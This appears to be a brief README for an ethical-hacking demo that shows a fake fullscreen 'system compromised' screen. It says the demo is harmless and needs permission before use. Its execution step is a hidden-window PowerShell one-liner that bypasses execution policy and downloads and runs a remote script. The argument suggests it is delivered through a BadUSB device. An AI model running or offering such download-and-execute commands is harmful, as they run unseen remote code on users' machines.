# System Compromise Demo

This script is a harmless demonstration.
It simulates a fullscreen "system compromised" Scenario.

> [!IMPORTANT]
> It MUST NOT be used on systems without permission.


## Execution
Windows Run Dialog:
```shell
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-Expression ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Flottegurke/ethical-hacking/main/compromise-demo/windows.ps1')) -at 'Bad USB beetle'"
```
